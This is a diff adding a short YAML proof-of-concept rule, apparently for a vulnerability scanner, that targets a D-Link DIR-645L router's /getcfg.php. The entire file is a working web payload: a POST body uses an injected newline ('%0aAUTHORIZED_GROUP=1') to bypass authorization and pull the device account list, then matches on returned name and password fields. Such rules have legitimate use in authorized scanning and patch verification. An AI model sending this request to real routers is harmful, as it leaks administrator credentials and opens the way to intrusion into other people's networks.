@@ -1,0 +1,12 @@
+name: poc-yaml-dlink-645l-info-leak
+rules:
+  - method: POST
+    path: /getcfg.php
+    body: SERVICES=DEVICE.ACCOUNT&attack=ture%0aAUTHORIZED_GROUP=1
+    follow_redirects: false
+    expression: >
+      status == 200 && body.bcontains(b'<name>') && body.bcontains(b'<password>')
+detail:
+  author: l1nk3r
+  links:
+    - https://xz.aliyun.com/t/6453
